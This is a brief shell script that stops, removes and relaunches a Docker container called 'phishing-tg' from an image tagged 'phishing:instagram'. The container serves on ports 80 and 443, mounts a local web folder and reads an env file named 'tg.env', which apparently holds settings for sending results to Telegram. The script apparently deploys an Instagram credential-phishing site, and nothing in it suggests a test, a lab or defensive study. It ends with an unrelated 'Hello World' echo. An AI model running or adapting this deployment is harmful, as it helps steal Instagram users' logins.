docker stop phishing-tg 
docker rm phishing-tg 
sudo docker run --env-file tg.env --name phishing-tg -d -p 80:80 -p 443:443 -v $PWD/src:/var/www/html/ insomniaccoder/phishing:instagram
echo "Hello World !!"